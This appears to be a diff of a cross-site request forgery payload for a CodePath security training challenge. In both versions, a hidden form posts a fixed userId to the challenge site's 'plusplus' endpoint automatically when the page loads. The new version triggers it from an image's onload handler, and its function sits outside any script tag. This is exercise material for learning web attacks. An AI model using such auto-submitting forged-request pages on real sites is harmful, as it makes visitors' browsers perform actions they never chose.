@@ -1,7 +1,14 @@
-<form name="csrfForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="post">
- <input type="hidden" name="userId" value="395e3936d76e4573a9da58f1049f7ebe9d19035d" />
-</form>
-<script>
- document.csrfForm.submit();
-</script>
-<img src=hacking-in-progress.gif>
+<img src='https://clintmint.github.io/hacking-in-progress.gif' onload=csrfHack()>
+
+function csrfHack() {
+  const form = document.createElement('form');
+  form.method = 'post';
+  form.action = 'https://security.codepath.com/user/csrfchallengetwo/plusplus';
+  const hiddenField = document.createElement('input');
+  hiddenField.type = 'hidden';
+  hiddenField.name = 'userId';
+  hiddenField.value = '395e3936d76e4573a9da58f1049f7ebe9d19035d';
+  form.appendChild(hiddenField);
+  document.body.appendChild(form);
+  form.submit();
+}
